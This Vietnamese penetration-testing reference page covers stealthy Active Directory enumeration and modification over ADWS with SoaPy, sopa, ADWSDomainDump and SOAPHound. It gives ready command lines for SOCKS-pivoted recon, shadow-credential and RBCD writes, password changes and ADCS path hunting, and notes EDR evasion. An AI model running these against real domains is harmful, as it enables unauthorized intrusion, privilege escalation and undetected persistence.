# Liệt kê Active Directory Web Services (ADWS) & Thu thập kín đáo

{{#include ../../banners/hacktricks-training.md}}

## ADWS là gì?

Active Directory Web Services (ADWS) **được bật theo mặc định trên mọi Domain Controller kể từ Windows Server 2008 R2** và lắng nghe trên TCP **9389**. Mặc dù có tên như vậy, **dịch vụ này không sử dụng HTTP**. Thay vào đó, dịch vụ cung cấp dữ liệu kiểu LDAP thông qua một ngăn xếp giao thức đóng khung .NET độc quyền:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Vì lưu lượng được đóng gói bên trong các khung SOAP nhị phân này và truyền qua một cổng ít phổ biến, **việc liệt kê qua ADWS ít có khả năng bị kiểm tra, lọc hoặc nhận diện bằng chữ ký hơn lưu lượng LDAP/389 & 636 truyền thống**. Với các operator, điều này có nghĩa là:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon kín đáo hơn – Các nhóm Blue team thường tập trung vào truy vấn LDAP.
* Có thể thu thập dữ liệu từ **các máy không chạy Windows (Linux, macOS)** bằng cách tunnel 9389/TCP qua SOCKS proxy.
* Thu thập được cùng dữ liệu như khi dùng LDAP (users, groups, ACLs, schema, v.v.) và có thể thực hiện **ghi dữ liệu** (ví dụ: `msDs-AllowedToActOnBehalfOfOtherIdentity` cho **RBCD**).

Các tương tác ADWS được triển khai qua WS-Enumeration: mỗi truy vấn bắt đầu bằng một thông điệp `Enumerate` xác định LDAP filter/attributes và trả về một GUID `EnumerationContext`, sau đó là một hoặc nhiều thông điệp `Pull` truyền kết quả theo từng đợt, tối đa bằng kích thước cửa sổ kết quả do máy chủ quy định.<sup>[[7]](#references)</sup> Các context hết hạn sau khoảng 30 phút, vì vậy công cụ cần phân trang kết quả hoặc chia filter (truy vấn theo prefix cho từng CN) để tránh mất trạng thái.<sup>[[8]](#references)</sup> Khi yêu cầu security descriptors, hãy chỉ định control `LDAP_SERVER_SD_FLAGS_OID` để bỏ qua SACL; nếu không, ADWS sẽ loại bỏ thuộc tính `nTSecurityDescriptor` khỏi phản hồi SOAP.

> LƯU Ý: ADWS cũng được nhiều công cụ RSAT GUI/PowerShell sử dụng, vì vậy lưu lượng có thể hòa lẫn với hoạt động quản trị hợp lệ.

## SoaPy – Client Python thuần

[SoaPy](https://github.com/logangoins/soapy) là **bản triển khai lại hoàn chỉnh ngăn xếp giao thức ADWS bằng Python thuần**. Công cụ tạo các frame NBFX/NBFSE/NNS/NMF khớp từng byte, cho phép thu thập dữ liệu từ các hệ thống giống Unix mà không cần dùng đến .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Tính năng chính

* Hỗ trợ **proxy qua SOCKS** (hữu ích khi dùng C2 implants).
* Search filter chi tiết như LDAP `-q '(objectClass=user)'`.
* Các thao tác **ghi dữ liệu** có mục tiêu cho RBCD, SPNs, account flags và key credentials.<sup>[[2]](#references)</sup>
* Có thể phân tích đầu ra SOAPy bằng **BOFHound** và nhập vào BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag `--parse` để định dạng timestamp / `userAccountControl` dễ đọc hơn khi cần.<sup>[[2]](#references)</sup>

### Các flag thu thập có mục tiêu & thao tác ghi dữ liệu

SoaPy cung cấp các switch được tuyển chọn để tái hiện những tác vụ săn tìm LDAP phổ biến nhất qua ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, cùng các tùy chọn `--query` / `--filter` dạng thô để tùy chỉnh truy vấn. Kết hợp các tùy chọn này với các thao tác ghi dữ liệu như `--rbcd <source>` (thiết lập `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (thiết lập SPN để Kerberoasting có mục tiêu) và `--asrep` (bật `DONT_REQ_PREAUTH` trong `userAccountControl`).<sup>[[2]](#references)</sup>

Ví dụ truy vấn SPN có mục tiêu, chỉ trả về `samAccountName` và `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Dùng cùng host/credentials để lập tức weaponise các phát hiện: dump các object đã được cấu hình RBCD bằng `--rbcds`, sau đó chạy `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` để thiết lập chuỗi Resource-Based Constrained Delegation (xem [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) để biết toàn bộ quy trình abuse).<sup>[[2]](#references)</sup>

### Cài đặt (máy chủ operator)

Cài đặt SOAPy CLI hiện tại từ repository upstream; tên executable phân biệt chữ hoa chữ thường trên các hệ thống Unix-like.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Thu thập chỉ bằng ticket qua SOCKS pivot

Nếu foothold cung cấp Kerberos ticket nhưng không có mật khẩu plaintext, hãy chuyển ticket `.kirbi` sang `ccache` như mô tả trong [Pass the Ticket](pass-the-ticket.md), sau đó trỏ SOAPy đến cache đó. Có thể dùng ticket dành cho dịch vụ LDAP của DC trong quy trình SOAPy ADWS đã được ghi lại; hãy định tuyến cả lưu lượng ADWS lẫn Kerberos qua pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials qua ADWS

Nếu principal hiện tại có thể ghi vào `msDS-KeyCredentialLink` của đối tượng mục tiêu, SOAPy có thể thêm key credential thông qua ADWS và xuất PFX tương ứng. Ghi lại DeviceID được trả về để xóa chính xác credential đó thay vì xóa toàn bộ thuộc tính. Sử dụng PFX cho PKINIT như giải thích trong [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump qua ADWS (Linux/Windows)

* Bản fork của `ldapdomaindump`, thay các truy vấn LDAP bằng lệnh gọi ADWS trên TCP/9389 để giảm khả năng bị phát hiện qua chữ ký LDAP.
* Thực hiện kiểm tra khả năng kết nối đến cổng 9389 ban đầu, trừ khi dùng `--force` (bỏ qua bước thăm dò nếu quá trình quét cổng gây nhiều nhiễu hoặc bị lọc).
* Đã thử nghiệm với Microsoft Defender for Endpoint và CrowdStrike Falcon, README ghi nhận bypass thành công.<sup>[[4]](#references)</sup>

### Cài đặt

```bash
pipx install .
```

### Cách sử dụng

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Output điển hình ghi lại quá trình kiểm tra khả năng kết nối đến cổng 9389, bind ADWS và thời điểm bắt đầu/kết thúc dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Client thực tiễn cho ADWS bằng Golang

Tương tự như soapy, [sopa](https://github.com/Macmod/sopa) triển khai ngăn xếp giao thức ADWS (MS-NNS + MC-NMF + SOAP) bằng Golang, cung cấp các cờ dòng lệnh để thực hiện những lệnh gọi ADWS như:<sup>[[5]](#references)</sup>

* **Tìm kiếm và truy xuất đối tượng** - `query` / `get`
* **Vòng đời đối tượng** - `create [user|computer|group|ou|container|custom]` và `delete`
* **Chỉnh sửa thuộc tính** - `attr [add|replace|delete]`
* **Quản lý tài khoản** - `set-password` / `change-password`
* và các lệnh khác như `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, v.v.

### Điểm nổi bật về ánh xạ giao thức

* Các truy vấn theo kiểu LDAP được thực hiện qua **WS-Enumeration** (`Enumerate` + `Pull`), hỗ trợ chọn lọc thuộc tính, kiểm soát phạm vi (Base/OneLevel/Subtree) và phân trang.
* Tính năng lấy một đối tượng đơn lẻ sử dụng **WS-Transfer** `Get`; thay đổi thuộc tính dùng `Put`; xóa dùng `Delete`.
* Tạo đối tượng tích hợp sẵn sử dụng **WS-Transfer ResourceFactory**; đối tượng tùy chỉnh sử dụng **IMDA AddRequest** dựa trên các mẫu YAML.
* Các thao tác mật khẩu là những hành động **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Khám phá metadata không cần xác thực (mex)

ADWS cung cấp WS-MetadataExchange mà không cần thông tin xác thực, đây là cách nhanh chóng để xác minh mức độ lộ diện trước khi xác thực:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Ghi chú về phát hiện DNS/DC và nhắm mục tiêu Kerberos

Sopa có thể phân giải DC thông qua SRV nếu bỏ qua `--dc` và cung cấp `--domain`. Công cụ truy vấn theo thứ tự này và sử dụng mục tiêu có mức ưu tiên cao nhất:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Về mặt vận hành, hãy ưu tiên dùng resolver do DC kiểm soát để tránh lỗi trong các môi trường bị phân đoạn:

* Dùng `--dns <DC-IP>` để **tất cả** truy vấn SRV/PTR/forward đều đi qua DNS của DC.
* Dùng `--dns-tcp` khi UDP bị chặn hoặc phản hồi SRV quá lớn.
* Nếu `--dc` là một IP, sopa luôn thực hiện tra cứu **PTR ngược**: bộ lọc địa chỉ `wsa:To` của ADWS yêu cầu FQDN ngay cả khi không dùng Kerberos. Hãy cung cấp trực tiếp FQDN của DC nếu không có reverse zone.<sup>[[5]](#references)</sup>

Ví dụ (IP + Kerberos, buộc dùng DNS thông qua DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Tùy chọn thông tin xác thực

Ngoài mật khẩu dạng văn bản thuần, sopa hỗ trợ **NT hashes**, **Kerberos AES keys**, **ccache** và **PKINIT certificates** (PFX hoặc PEM) để xác thực ADWS. Kerberos được sử dụng mặc định khi dùng `--aes-key`, `-c` (ccache) hoặc các tùy chọn dựa trên certificate.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Tạo đối tượng tùy chỉnh thông qua template

Với các lớp đối tượng tùy ý, lệnh `create custom` sử dụng template YAML ánh xạ tới một IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` và `rdn` xác định container và DN tương đối.
* `attributes[].name` hỗ trợ `cn` hoặc `addata:cn` có namespace.
* `attributes[].type` chấp nhận `string|int|bool|base64|hex` hoặc `xsd:*` tường minh.
* **Không** bao gồm `ad:relativeDistinguishedName` hoặc `ad:container-hierarchy-parent`; sopa sẽ tự chèn chúng.
* Các giá trị `hex` được chuyển đổi thành `xsd:base64Binary`; dùng `value: ""` để đặt chuỗi rỗng.

## SOAPHound – Thu thập ADWS với khối lượng lớn (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) là một collector .NET giữ toàn bộ tương tác LDAP bên trong ADWS và xuất JSON tương thích với BloodHound v4. Công cụ này tạo một cache đầy đủ gồm `objectSid`, `objectGUID`, `distinguishedName` và `objectClass` một lần (`--buildcache`), sau đó tái sử dụng cache cho các lượt `--bhdump`, `--certdump` (ADCS) hoặc `--dnsdump` (DNS tích hợp AD) với khối lượng lớn, nhờ đó chỉ khoảng 35 thuộc tính quan trọng rời khỏi DC. AutoSplit (`--autosplit --threshold <N>`) tự động chia nhỏ truy vấn theo tiền tố CN để không vượt quá thời gian chờ EnumerationContext 30 phút trong các forest lớn.<sup>[[8]](#references)</sup>

Quy trình thường dùng trên VM vận hành đã tham gia domain:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Các slot JSON đã xuất được đưa trực tiếp vào quy trình SharpHound/BloodHound—xem [BloodHound methodology](bloodhound.md) để biết các ý tưởng dựng graph ở bước tiếp theo. AutoSplit giúp SOAPHound hoạt động ổn định trên các forest có hàng triệu object, đồng thời giảm số lượng query so với snapshot kiểu ADExplorer.

## Quy trình thu thập AD kín đáo

Quy trình sau cho biết cách enumerate **domain & ADCS objects** qua ADWS, chuyển đổi chúng sang BloodHound JSON và săn tìm các attack path dựa trên certificate – tất cả đều từ Linux:

1. **Tunnel 9389/TCP** từ network của mục tiêu đến máy của bạn (ví dụ: qua Chisel, Meterpreter, SSH dynamic port-forward, v.v.). Định tuyến raw TCP client qua SOCKS bằng `proxychains4 SOAPy ...` (cấu hình địa chỉ SOCKS5 trong `proxychains4.conf`); `HTTPS_PROXY` không proxy giao thức không phải HTTP này.<sup>[[9]](#references)</sup>

2. **Thu thập root domain object:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Thu thập các đối tượng liên quan đến ADCS từ Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Chuyển đổi sang BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Tải ZIP lên** giao diện BloodHound và chạy các truy vấn cypher như `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` để phát hiện các đường dẫn leo thang chứng chỉ (ESC1, ESC8, v.v.).

### Ghi `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Với quyền ghi vào đối tượng máy tính đích, hãy dùng hành động RBCD của SOAPy thay vì chuỗi security descriptor thô. Ở đây, `WEBSRV01$` là nguồn được kiểm soát và `FILE01$` là đích có thuộc tính sẽ thay đổi.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Tiếp tục chuỗi Kerberos S4U trong [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Tóm tắt công cụ

| Mục đích | Công cụ | Ghi chú |
|---------|------|-------|
| Liệt kê ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, đọc/ghi |
| Dump ADWS khối lượng lớn | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, ưu tiên cache, các chế độ BH/ADCS/DNS |
| Nhập dữ liệu vào BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Chuyển đổi log SoaPy/ldapsearch |
| Xâm phạm chứng chỉ | [Certipy](https://github.com/ly4k/Certipy) | Có thể định tuyến qua cùng SOCKS |
| Liệt kê ADWS và thay đổi đối tượng | [sopa](https://github.com/Macmod/sopa) | Client đa năng để giao tiếp với các endpoint ADWS đã biết - cho phép liệt kê, tạo đối tượng, sửa thuộc tính và thay đổi mật khẩu |



## References

- [1] [SpecterOps – Hãy nhớ sử dụng SOAP(y) – Hướng dẫn cho operator về thu thập AD bí mật bằng ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy trên GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound trên GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump trên GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa trên GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Các đặc tả MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Liệt kê môi trường Active Directory một cách kín đáo thông qua ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Công cụ SOAPHound để thu thập dữ liệu Active Directory qua ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki SOAPy – Trinh sát](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki SOAPy – Hậu khai thác](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
